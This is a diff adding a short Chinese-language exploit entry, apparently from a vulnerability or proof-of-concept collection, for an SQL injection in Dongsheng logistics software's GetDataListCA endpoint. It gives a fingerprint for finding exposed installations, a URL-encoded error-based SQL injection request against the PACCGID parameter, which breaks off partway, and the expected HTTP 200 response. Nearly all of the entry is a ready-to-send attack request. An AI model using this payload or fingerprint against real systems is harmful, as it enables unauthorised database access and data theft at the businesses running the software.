@@ -1,0 +1,6 @@
+# 东胜物流软件GetDataListCA存在SQL注入漏洞
+
+- **系统**：东胜物流软件　|　**类型**：SQL注入　|　**CVE**：—
+- **指纹**：`body="FeeCodes/CompanysAdapter.aspx"`
+- **请求**：`GET /MvcShipping/MsCwGenlegAccitems/GetDataListCA?PACCGID=1%27%29+AND+6782+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%286782%3D6782%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%2810`
+- **预期**：200　|　—
